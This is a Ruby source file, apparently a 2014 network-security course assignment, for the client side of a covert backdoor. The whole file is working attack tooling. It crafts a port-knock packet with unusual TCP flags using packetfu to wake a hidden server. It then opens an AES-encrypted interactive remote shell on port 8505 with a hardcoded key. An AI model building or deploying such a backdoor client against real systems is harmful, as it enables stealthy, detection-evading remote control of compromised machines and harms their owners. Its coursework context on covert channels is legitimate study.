#! /usr/bin/env ruby
=begin
-------------------------------------------------------------------------------------
--  SOURCE FILE:    client.rb - Client applcation for connecting to Backdoor server
--                              server program.
--
--  PROGRAM:        client
--                ./client.rb 
--
--  FUNCTIONS:              Port Knocking, Crafted packets, AES256 payload wncryption
--                          TCP echo client
--
--  Ruby Gems required:     packetfu
--                          https://rubygems.org/gems/packetfu
--                          pcaprub
--                          https://rubygems.org/gems/pcaprub
--                      
--
--  DATE:           May 2014
--
--  REVISIONS:      See development repo: https://github.com/deuterium/comp8505-assign2
--
--  DESIGNERS:      Chris Wood - chriswood.ca@gmail.com
--
--  PROGRAMMERS:    Chris Wood - chriswood.ca@gmail.com
--
--  NOTES:          problem with client/server socket buffer. sometimes messages get overread.
--  
---------------------------------------------------------------------------------------
=end

require 'socket'
require 'openssl' #http://www.ruby-doc.org/stdlib-2.1.1/libdoc/openssl/rdoc/OpenSSL/Cipher.html
require 'readline' #http://www.ruby-doc.org/stdlib-2.1.1/libdoc/readline/rdoc/Readline.html
require 'packetfu'
require 'pcaprub'

## Variables
$key = OpenSSL::Digest::SHA256.new("verysecretkey").digest
@dev = "wlp2s0"

## Functions

# Decrypts a received message
#
# @param [String] data 
# - data to decrypt
# @return [String]
# - decrypted message
def decrypt(data)
    cipher = OpenSSL::Cipher::AES256.new(:CBC)
    cipher.decrypt

    cipher.key = $key

    begin
        msg = cipher.update(data)
        msg << cipher.final
    rescue Exception => e
        puts e
    end
    return msg
end

# Encrypts a message for transmission
#
# @param [String] data 
# - msg to encrypt
# @return [String]
# - encrypted payload
def encrypt(data)
    cipher = OpenSSL::Cipher::AES256.new(:CBC)
    cipher.encrypt

    cipher.key = $key

    begin
        payload = cipher.update(data)
        payload << cipher.final
    rescue Exception => e
        puts e
    end
    return payload
end

# Sends a packet with an expected signature. This is the "knock" for the
# backdoor.
#
# @param [String] ip 
# - IP Address to send knock to
def knock(ip)
    config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> @dev)).config
    p = PacketFu::TCPPacket.new(:config=> config, :flavor=> "Linux")

    p.ip_daddr = ip
    p.tcp_src = 27564
    p.tcp_flags.urg = 0
    p.tcp_flags.ack = 0
    p.tcp_flags.psh = 1
    p.tcp_flags.rst = 1
    p.tcp_flags.syn = 0
    p.tcp_flags.fin = 1

    p.recalc
    p.to_w
    puts "knock, knock, knock ......."
end

# Connects to the backdoor and establishes shell access
#
# @param [String] ip 
# - IP Address to send knock to
def comm(ip)
    begin
        s = TCPSocket.new ip, 8505
    rescue Exception
        puts "error: unable to connect. are you sure its up?"
        return
    end

    loop {
        s.puts encrypt(Readline.readline('> ', true))
        s.flush
        puts decrypt(s.recv(1024).chomp)
    }
end

# Client program menu. prompts for input to guide to
# correct functions.
#
def menu
    puts "welcome to hacky hack program"
    
    loop {
        puts "push 1 to knock server\npush 2 to connect to server"
        cmd = Readline.readline('> ', true)
        case cmd.to_i
        when 1
            knock(Readline.readline('enter ip: ', true))
        when 2
            comm(Readline.readline('enter ip: ', true))
        else
            break
        end 
    }

end

## Main
menu
